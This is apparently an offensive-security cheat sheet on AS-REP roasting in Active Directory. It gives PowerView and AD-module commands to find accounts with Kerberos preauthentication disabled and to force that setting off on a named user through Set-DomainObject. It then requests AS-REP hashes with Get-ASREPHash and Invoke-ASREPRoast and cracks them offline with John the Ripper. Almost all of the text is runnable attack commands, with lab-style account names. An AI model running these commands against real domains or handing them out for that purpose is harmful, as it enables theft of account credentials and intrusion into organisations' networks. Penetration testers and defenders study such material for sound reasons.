# Targeted Kerberoasting (AS-REP)
- If a user's UserAccountControl settings have "Do not require Kerberos
preauthentication" enabled i.e. Kerberos preauth is disabled, it is
possible to grab user's crackable AS REP and brute force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth
can be forced disabled as well.

1. Enumerate accounts with Kerberos 'Preauth disabled'
```powershell
#use powerview_dev
Get-DomainUser -PreauthNotRequired -Verbose

# ADModule
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

we could also force disable kerberos preauth
```powershell
# enum permissions for RDPUsers on ACLs
# using powerview_dev
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

#use powerview_dev
Get-DomainUser -PreauthNotRequired -Verbose
```

2. Request encrypted AS-REP for offline brute-force

```powershell
#Using ASREPRoast
Get-ASREPHash -UserName VPN1User -Verbose

#enum all users with kerberos preauth disabled and request a hash
Invoke-ASREPRoast -Verbose
```

3. Crack hashes
```
#using john (bleeding-jumbo branch)
./john vpn1user.txt --wordlist=wordlist.txt

```